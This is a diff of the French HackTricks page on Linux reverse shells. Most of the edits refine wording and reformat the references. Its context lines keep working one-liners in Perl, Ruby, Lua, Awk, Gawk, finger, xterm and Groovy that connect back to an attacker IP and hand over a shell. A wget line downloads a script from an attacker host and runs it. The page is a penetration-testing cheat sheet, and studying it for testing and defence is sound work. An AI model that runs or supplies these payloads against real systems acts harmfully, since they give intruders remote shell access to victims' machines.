@@ -8,7 +8,7 @@ Autres façons de soutenir HackTricks :
 
 * Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
@@ -67,7 +67,8 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Shell Avancé
 
-Il se peut que vous rencontriez des cas où vous avez une **RCE dans une application web sur une machine Linux** mais en raison de règles Iptables ou d'autres types de filtrage, **vous ne pouvez pas obtenir de shell inversé**. Ce "shell" vous permet de maintenir un shell PTY via cette RCE en utilisant des tubes à l'intérieur du système victime.\
+Si vous rencontrez une **vulnérabilité RCE** au sein d'une application web basée sur Linux, il peut arriver que **l'obtention d'un shell inversé devienne difficile** en raison de la présence de règles Iptables ou d'autres filtres. Dans de tels scénarios, envisagez de créer un shell PTY au sein du système compromis en utilisant des pipes.
+
 Vous pouvez trouver le code sur [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)
 
 Il vous suffit de modifier :
@@ -76,7 +77,7 @@ Il vous suffit de modifier :
 * Le préfixe et le suffixe de votre charge utile (le cas échéant)
 * La manière dont la charge utile est envoyée (en-têtes ? données ? informations supplémentaires ?)
 
-Ensuite, vous pouvez simplement **envoyer des commandes** ou même **utiliser la commande `upgrade`** pour obtenir un shell PTY complet (notez que les tubes sont lus et écrits avec un délai approximatif de 1,3s).
+Ensuite, vous pouvez simplement **envoyer des commandes** ou même **utiliser la commande `upgrade`** pour obtenir un PTY complet (notez que les pipes sont lus et écrits avec un délai approximatif de 1,3 seconde).
 
 ## Netcat
 ```bash
@@ -125,7 +126,7 @@ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socke
 ```
 ## Perl
 
-Perl est un langage de script polyvalent et puissant couramment utilisé pour l'automatisation de tâches, le traitement de texte et la manipulation de fichiers. Il est également largement utilisé dans le domaine de la sécurité informatique pour diverses tâches, telles que l'analyse de fichiers journaux, la manipulation de données et la création d'outils personnalisés. Perl offre une grande flexibilité et une grande capacité à interagir avec le système d'exploitation, ce qui en fait un outil précieux pour les professionnels de la sécurité informatique.
+Perl est un langage de script polyvalent souvent utilisé pour l'automatisation de tâches, le traitement de texte et la manipulation de fichiers. Il est également largement utilisé dans le domaine de la sécurité informatique pour diverses tâches, telles que l'analyse de fichiers journaux, la manipulation de données et la création d'outils personnalisés. Perl offre de puissantes fonctionnalités pour les hackers et les professionnels de la sécurité, en raison de sa flexibilité et de sa capacité à manipuler efficacement les chaînes de caractères et les expressions régulières.
 ```bash
 perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
@@ -136,8 +137,6 @@ ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 ## PHP
-
-PHP (Hypertext Preprocessor) is a widely-used open source general-purpose scripting language that is especially suited for web development and can be embedded into HTML. It is executed on the server side, meaning that the code is processed on the server before being sent to the client's web browser. PHP can perform various tasks such as collecting form data, generating dynamic page content, sending and receiving cookies, and more.
 ```php
 // Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
 // Using this method may lead to instances where the connection reaches out to the listener and then closes.
@@ -162,7 +161,7 @@ attacker> ncat -v 10.0.0.22 4444 --ssl
 ```
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-Trouvez les vulnérabilités les plus importantes afin de pouvoir les corriger plus rapidement. Intruder suit votre surface d'attaque, lance des analyses de menaces proactives, trouve des problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) aujourd'hui.
+Trouvez las vulnérabilités les plus importantes afin de les corriger plus rapidement. Intruder suit votre surface d'attaque, lance des analyses de menaces proactives, trouve des problèmes dans l'ensemble de votre pile technologique, des APIs aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) aujourd'hui.
 
 {% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
@@ -174,7 +173,7 @@ echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","
 ```
 ## Lua
 
-Lua est un langage de script léger et puissant. Il est souvent utilisé pour l'automatisation de tâches, la création de scripts et le développement d'applications. Lua est largement utilisé dans le domaine des jeux vidéo en raison de sa flexibilité et de sa facilité d'intégration avec d'autres langages de programmation.
+Lua est un langage de script léger et puissant. Il est souvent utilisé pour l'automatisation de tâches, la création de scripts et le développement d'applications. Lua est largement utilisé dans le domaine des jeux vidéo en raison de sa flexibilité et de sa facilité d'intégration.
 ```bash
 #Linux
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
@@ -262,7 +261,7 @@ Awk est un langage de programmation polyvalent et une commande de traitement de 
 awk -F ',' '{print $1}' fichier.csv
 ```
 
-Dans cet exemple, `-F ','` spécifie que la virgule est utilisée comme délimiteur de champ, et `{print $1}` indique à Awk d'imprimer la première colonne de chaque ligne du fichier CSV.
+Dans cet exemple, Awk divise chaque ligne du fichier CSV en champs en utilisant la virgule comme délimiteur, puis affiche la première colonne de chaque ligne.
 ```bash
 awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
@@ -272,7 +271,7 @@ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s;
 ```bash
 while true; do nc -l 79; done
 ```
-Pour envoyer la commande, écrivez-la, appuyez sur Entrée et appuyez sur CTRL+D (pour arrêter STDIN)
+Pour envoyer la commande, écrivez-la, appuyez sur Entrée, puis sur CTRL+D (pour arrêter STDIN)
 
 **Victime**
 ```bash
@@ -282,7 +281,7 @@ export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | gre
 ```
 ## Gawk
 
-Gawk est un langage de programmation interprété qui est souvent utilisé pour le traitement de fichiers texte et la génération de rapports. Il est également couramment utilisé par les hackers pour manipuler des données et automatiser des tâches lors de tests d'intrusion.
+Gawk est un langage de programmation interprété qui est souvent utilisé pour le traitement de fichiers texte et la génération de rapports. Il est également couramment utilisé par les hackers pour manipuler des données et automatiser des tâches lors de tests d'intrusion. Gawk est particulièrement utile pour extraire des informations spécifiques à partir de fichiers texte volumineux en utilisant des expressions régulières.
 ```bash
 #!/usr/bin/gawk -f
 
@@ -307,17 +306,16 @@ close(Service)
 ```
 ## Xterm
 
-Une des formes les plus simples de shell inversé est une session xterm. La commande suivante doit être exécutée sur le serveur. Elle tentera de se connecter à vous (10.0.0.1) sur le port TCP 6001.
+Cela tentera de se connecter à votre système sur le port 6001 :
 ```bash
 xterm -display 10.0.0.1:1
 ```
-Pour intercepter le xterm entrant, démarrez un serveur X (:1 - qui écoute sur le port TCP 6001). Une façon de faire cela est avec Xnest (à exécuter sur votre système):
+Pour attraper le shell inversé, vous pouvez utiliser (qui écoutera sur le port 6001) :
 ```bash
-Xnest :1
-```
-Vous devrez autoriser la cible à se connecter à vous (commande également exécutée sur votre hôte) :
-```bash
+# Authorize host
 xhost +targetip
+# Listen
+Xnest :1
 ```
 ## Groovy
 
@@ -328,15 +326,12 @@ int port=8044;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
-## Bibliographie
+## Références
+* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
+* [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
+* [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
+* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
-{% embed url="https://highon.coffee/blog/reverse-shell-cheat-sheet/" %}
-
-{% embed url="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell" %}
-
-{% embed url="https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/" %}
-
-{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" %}
 
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
